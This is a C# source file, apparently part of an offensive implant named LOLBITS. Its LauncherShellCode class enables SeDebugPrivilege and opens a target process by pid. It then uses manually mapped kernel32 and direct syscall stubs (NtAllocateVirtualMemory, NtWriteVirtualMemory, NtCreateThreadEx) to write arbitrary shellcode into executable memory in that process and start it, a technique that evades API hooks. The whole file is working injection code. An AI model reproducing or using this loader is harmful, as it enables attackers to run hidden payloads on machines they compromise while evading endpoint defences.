using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

namespace LOLBITS.Controlling
{
    public class LauncherShellCode
    {

        /////////////////////////// Struct ///////////////////////////

        public unsafe struct MyBuffer32
        {
            public fixed char FixedBuffer[32];
        }

        [StructLayout(LayoutKind.Sequential)]
        public unsafe struct Unknown32
        {
            public readonly uint Size;
            public readonly uint Unknown1;
            public readonly uint Unknown2;
            public readonly MyBuffer32* Unknown3;
            public readonly uint Unknown4;
            public readonly uint Unknown5;
            public readonly uint Unknown6;
            public readonly MyBuffer32* Unknown7;
            public readonly uint Unknown8;
        }

        public unsafe struct MyBuffer64
        {
            public fixed char FixedBuffer[64];
        }

        [StructLayout(LayoutKind.Sequential)]
        public unsafe struct Unknown64
        {
            public long Size;
            public long Unknown1;
            public long Unknown2;
            public MyBuffer64* UnknownPtr;
            public long Unknown3;
            public long Unknown4;
            public long Unknown5;
            public MyBuffer64* UnknownPtr2;
            public long Unknown6;
        }

        /////////////////////////// Native Syscall ///////////////////////////

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate int NtAllocateVirtualMemory(IntPtr processHandle, 
                                                    out IntPtr baseAddress,
                                                    uint zeroBits, 
                                                    out UIntPtr regionSize, 
                                                    DInvoke.Win32.Kernel32.MemoryAllocationFlags allocationType,
                                                    DInvoke.Win32.Kernel32.MemoryProtectionFlags protect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate int NtWriteVirtualMemory(IntPtr processHandle, IntPtr address, byte[] buffer, UIntPtr size, IntPtr bytesWrittenBuffer);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate int NtCreateThreadEx32(
            out IntPtr hThread,
            int desiredAccess,
            IntPtr objectAttributes,
            IntPtr processHandle,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            bool createSuspended,
            uint stackZeroBits,
            uint sizeOfStackCommit,
            uint sizeOfStackReserve,
            out Unknown32 lpBytesBuffer);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)] //NtCreateThreadEx expects different kind of parameters for 32 and 64 bits processess. 
        public delegate int NtCreateThreadEx64(
            out IntPtr hThread,
            long desiredAccess,
            IntPtr objectAttributes,
            IntPtr processHandle,
            IntPtr lpStartAddress,
            IntPtr lpParameter, 
            bool createSuspended,
            ulong stackZeroBits,
            ulong sizeOfStackCommit,
            ulong sizeOfStackReserve, 
            out Unknown64 lpBytesBuffer);


        public static void Main(byte[] shellCode, SysCallManager sysCall, int pid)
        {
            var obj = new LauncherShellCode();

            var thr1 = new Thread(ExecuteShellCodeInMemory);

            var a = new object[] { shellCode, sysCall, pid};

            thr1.Start(a);
        }

        private static unsafe void ExecuteShellCodeInMemory(object args)        
        {
            var parameterArguments = (object[])args;
            var sc = (byte[]) parameterArguments[0];
            var sysCall = (SysCallManager)parameterArguments[1];
            var pid = (int)parameterArguments[2];
            var handle = Process.GetCurrentProcess().Handle;

            if(pid != -1)
            {
                var token = IntPtr.Zero;
                Utils.GetProcessToken(Process.GetCurrentProcess().Handle, DInvoke.Win32.WinNT._TOKEN_ACCESS_FLAGS.TokenAdjustPrivileges, out token, sysCall); 

                var l = new List<string>();
                l.Add("SeDebugPrivilege");


                Utils.EnablePrivileges(token, l, sysCall);

                Utils.GetProcessHandle(pid, out handle, DInvoke.Win32.Kernel32.ProcessAccessFlags.PROCESS_CREATE_THREAD | DInvoke.Win32.Kernel32.ProcessAccessFlags.PROCESS_QUERY_INFORMATION |
                                                        DInvoke.Win32.Kernel32.ProcessAccessFlags.PROCESS_VM_OPERATION |
                                                        DInvoke.Win32.Kernel32.ProcessAccessFlags.PROCESS_VM_WRITE | DInvoke.Win32.Kernel32.ProcessAccessFlags.PROCESS_VM_READ, sysCall);
            }

            try
            {
                var baseAddress = IntPtr.Zero;
                var shellCode = sysCall.GetSysCallAsm("NtAllocateVirtualMemory");
                DInvoke.PE.PE_MANUAL_MAP moduleDetails = sysCall.getMappedModule("C:\\Windows\\System32\\kernel32.dll");


                object[] virtualAlloc = { IntPtr.Zero, (UIntPtr)shellCode.Length, DInvoke.Win32.Kernel32.MemoryAllocationFlags.Commit | DInvoke.Win32.Kernel32.MemoryAllocationFlags.Reserve,
                                          DInvoke.Win32.Kernel32.MemoryProtectionFlags.ExecuteReadWrite };
                var shellCodeBuffer = (IntPtr)DInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "VirtualAlloc",
                                                                                        typeof(DInvoke.Win32.DELEGATES.VirtualAlloc), virtualAlloc);

                Marshal.Copy(shellCode, 0, shellCodeBuffer, shellCode.Length);
                var sysCallDelegate =
                    Marshal.GetDelegateForFunctionPointer(shellCodeBuffer, typeof(NtAllocateVirtualMemory));

                var arguments = new object[]
                {
                    handle, baseAddress, (uint) 0, (UIntPtr) (sc.Length + 1),
                    DInvoke.Win32.Kernel32.MemoryAllocationFlags.Reserve | DInvoke.Win32.Kernel32.MemoryAllocationFlags.Commit,
                    DInvoke.Win32.Kernel32.MemoryProtectionFlags.ExecuteReadWrite
                };
                var returnValue = sysCallDelegate.DynamicInvoke(arguments);

                if ((int) returnValue != 0) return;

                baseAddress = (IntPtr) arguments[1]; 

                shellCode = sysCall.GetSysCallAsm("NtWriteVirtualMemory");


                object[] virtualAlloc2 = { IntPtr.Zero, (UIntPtr)shellCode.Length, DInvoke.Win32.Kernel32.MemoryAllocationFlags.Commit | DInvoke.Win32.Kernel32.MemoryAllocationFlags.Reserve,
                                          DInvoke.Win32.Kernel32.MemoryProtectionFlags.ExecuteReadWrite };
                shellCodeBuffer = (IntPtr)DInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "VirtualAlloc",
                                                                                        typeof(DInvoke.Win32.DELEGATES.VirtualAlloc), virtualAlloc2);

                Marshal.Copy(shellCode, 0, shellCodeBuffer, shellCode.Length);
                sysCallDelegate = Marshal.GetDelegateForFunctionPointer(shellCodeBuffer, typeof(NtWriteVirtualMemory));

                arguments = new object[] {handle, baseAddress, sc, (UIntPtr) (sc.Length + 1), IntPtr.Zero};

                returnValue = sysCallDelegate.DynamicInvoke(arguments);
                baseAddress = (IntPtr) arguments[1];

                if ((int) returnValue != 0) return;

                var a = new MyBuffer64();
                var b = new MyBuffer64();

                var u = new Unknown64();
                u.Size = (uint) Marshal.SizeOf(u);
                u.Unknown1 = 65539;
                u.Unknown2 = 16;
                u.UnknownPtr = &a;
                u.Unknown4 = 65540;
                u.Unknown5 = 8;
                u.Unknown6 = 0;
                u.UnknownPtr2 = &b;
                u.Unknown3 = 0;

                shellCode = sysCall.GetSysCallAsm("NtCreateThreadEx");

                object[] virtualAlloc3 = { IntPtr.Zero, (UIntPtr)shellCode.Length, DInvoke.Win32.Kernel32.MemoryAllocationFlags.Commit | DInvoke.Win32.Kernel32.MemoryAllocationFlags.Reserve,
                                          DInvoke.Win32.Kernel32.MemoryProtectionFlags.ExecuteReadWrite };
                shellCodeBuffer = (IntPtr)DInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "VirtualAlloc",
                                                                                        typeof(DInvoke.Win32.DELEGATES.VirtualAlloc), virtualAlloc3);

                Marshal.Copy(shellCode, 0, shellCodeBuffer, shellCode.Length);
                sysCallDelegate = Marshal.GetDelegateForFunctionPointer(shellCodeBuffer, typeof(NtCreateThreadEx64));

                arguments = new object[]
                {
                    IntPtr.Zero, 0x001FFFFF, IntPtr.Zero, handle, baseAddress, IntPtr.Zero, false, (ulong) 0, (ulong) 0,
                    (ulong) 0, u
                };
                returnValue = sysCallDelegate.DynamicInvoke(arguments);
            }
            catch
            {

            }
        }
    }
}